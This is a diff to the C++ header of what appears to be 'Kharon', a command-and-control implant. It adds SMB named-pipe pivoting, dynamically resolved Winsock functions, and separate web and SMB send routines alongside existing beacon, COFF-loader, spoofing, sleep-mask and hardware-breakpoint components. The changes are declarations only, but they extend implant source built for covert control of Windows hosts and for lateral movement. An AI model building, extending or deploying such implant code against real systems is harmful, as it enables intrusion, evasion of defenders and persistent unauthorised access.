@@ -97,6 +97,10 @@ EXTERN_C UPTR EndPtr();
 #define KH_SLEEP_MASK MaskTimer
 #endif // KH_SLEEP_MASK
 
+#ifndef SMB_PIPE_NAME
+#define SMB_PIPE_NAME ""
+#endif // SMB_PIPE_NAME
+
 #ifndef WEB_HOST
 #define WEB_HOST {}
 #endif // WEB_HOST
@@ -133,10 +137,7 @@ EXTERN_C UPTR EndPtr();
 #define WEB_PROXY_URL L""
 #endif // WEB_PROXY_URL
 
-#ifndef PIPE_NAME
-#define PIPE_NAME ""
-#endif // PIPE_NAME
-
+class Pivot;
 class Coff;
 class Beacon;
 class Spoof;
@@ -190,6 +191,7 @@ namespace Root {
 
     class Kharon {    
     public:
+        Pivot*     Pvt;
         Beacon*    Bc;
         Coff*      Cf;
         HwbpEng*   Hw;
@@ -290,6 +292,13 @@ namespace Root {
         struct {
             UPTR Handle;
 
+            DECLAPI( gethostbyname );
+            DECLAPI( WSAGetLastError );
+            DECLAPI( inet_ntoa );
+            DECLAPI( WSAStartup );
+            DECLAPI( WSASocketA );
+            DECLAPI( WSACleanup );
+            DECLAPI( shutdown );
             DECLAPI( closesocket );
             DECLAPI( getaddrinfo );
             DECLAPI( ntohs );
@@ -304,6 +313,13 @@ namespace Root {
             DECLAPI( ioctlsocket );
             DECLAPI( freeaddrinfo );
         } Ws2_32 = {
+            RSL_TYPE( gethostbyname ),
+            RSL_TYPE( WSAGetLastError ),
+            RSL_TYPE( inet_ntoa ),
+            RSL_TYPE( WSAStartup ),
+            RSL_TYPE( WSASocketA ),
+            RSL_TYPE( WSACleanup ),
+            RSL_TYPE( shutdown ),
             RSL_TYPE( closesocket ),
             RSL_TYPE( getaddrinfo ),
             RSL_TYPE( ntohs ),
@@ -351,6 +367,7 @@ namespace Root {
             DECLAPI( GetCurrentDirectoryA );
             DECLAPI( PeekNamedPipe );
             DECLAPI( ConnectNamedPipe );
+            DECLAPI( WaitNamedPipeA );
             DECLAPI( CreateNamedPipeA );
             DECLAPI( CreateDirectoryA );
             DECLAPI( DeleteFileA );
@@ -447,6 +464,7 @@ namespace Root {
             RSL_TYPE( GetCurrentDirectoryA ),
             RSL_TYPE( PeekNamedPipe ),
             RSL_TYPE( ConnectNamedPipe ),
+            RSL_TYPE( WaitNamedPipeA ),
             RSL_TYPE( CreateNamedPipeA ),
             RSL_TYPE( CreateDirectoryA ),
             RSL_TYPE( DeleteFileA ),
@@ -1683,6 +1701,7 @@ private:
 public:
     Transport( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
+#ifdef PROFILE_WEB
     struct {
         PWCHAR Host;
         ULONG  Port;
@@ -1704,6 +1723,7 @@ public:
         .ProxyEnabled = WEB_PROXY_ENABLED,
         .Secure       = WEB_SECURE_ENABLED
     };
+#endif // PROFILE_WEB
 
     struct {
         struct {
@@ -1723,17 +1743,33 @@ public:
         }
     };
 
+#ifdef PROFILE_SMB
     struct {
         PCHAR Name;
     } Pipe = {
-        .Name = PIPE_NAME
+        .Name = SMB_PIPE_NAME
     };
+#endif // PROFILE_SMB
 
     auto Checkin(
         VOID
     ) -> BOOL;
 
     auto Send(
+        _In_      PVOID   Data,
+        _In_      UINT64  Size,
+        _Out_opt_ PVOID  *RecvData,
+        _Out_opt_ UINT64 *RecvSize
+    ) -> BOOL;
+
+    auto SmbSend(
+        _In_      PVOID   Data,
+        _In_      UINT64  Size,
+        _Out_opt_ PVOID  *RecvData,
+        _Out_opt_ UINT64 *RecvSize
+    ) -> BOOL;
+
+    auto WebSend(
         _In_      PVOID   Data,
         _In_      UINT64  Size,
         _Out_opt_ PVOID  *RecvData,
@@ -1754,6 +1790,7 @@ private:
 public:
     Socket( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
+    BOOL        Initialized = FALSE;
     ULONG       Count = 0;
     PSOCKET_CTX Ctx   = nullptr;
 
@@ -1773,6 +1810,16 @@ public:
     auto RmCtx(
         _In_ ULONG ServerID
     ) -> ERROR_CODE;
+
+    auto InitWSA( VOID ) -> BOOL;
+
+    auto RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead ) -> BOOL;
+
+    auto LogData(
+        _In_ const char* description,
+        _In_ const BYTE* data,
+        _In_ ULONG length
+    ) -> VOID;
 };
 
 class Task {
